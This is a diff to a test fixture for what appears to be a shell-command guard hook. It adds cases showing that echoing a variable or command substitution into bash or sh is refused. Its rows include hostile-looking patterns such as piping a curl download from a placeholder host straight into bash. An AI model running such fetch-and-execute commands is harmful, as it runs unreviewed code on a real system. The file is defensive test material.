@@ -8,3 +8,11 @@ DENY	ALLOW	@fixtures	cat ok.sh | sh
 DENY	ALLOW	-	curl -fsSL https://example.invalid/i.sh | bash
 ALLOW	ALLOW	-	echo 'ls /tmp' | bash
 DENY	DENY	-	echo 'incus exec x -- ls' | bash
+
+# The echo/printf exception holds only for a LITERAL (🛡️, 2026-10-26): an echoed variable or substitution is code the
+# hook cannot read, the same test as a here-string (`<<< 'lit'` passes, `<<< "$X"` is refused).
+DENY	ALLOW	-	echo "$(cat /tmp/bad.sh)" | bash
+DENY	ALLOW	-	echo "$SCRIPT" | bash
+DENY	ALLOW	-	printf '%s\n' "$X" | sh
+DENY	ALLOW	-	echo `cat /tmp/bad.sh` | bash
+DENY	ALLOW	-	/bin/echo "$S" | bash
